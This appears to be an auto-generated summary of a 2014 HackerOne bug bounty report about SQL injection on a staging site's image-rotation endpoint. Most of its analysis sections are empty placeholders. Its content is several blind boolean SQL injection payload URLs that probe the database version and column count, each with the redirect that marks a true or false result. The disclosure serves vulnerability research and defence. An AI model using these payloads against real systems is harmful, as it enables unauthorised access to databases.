# SQL Injection

## Metadata
- **Source:** HackerOne
- **Report:** 23014 | https://hackerone.com/reports/23014
- **Submitted:** 2014-08-08
- **Reporter:** yappare
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=4 FALSE
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5 TRUE

https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE

FALSE = will redirect to access denied
TRUE = redirected to page not foun

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=4 FALSE
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5 TRUE

https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE

FALSE = will redirect to access denied
TRUE = redirected to page not found

fid must be a valid image id



</details>

---
*Analysed by Claude on 2026-05-24*
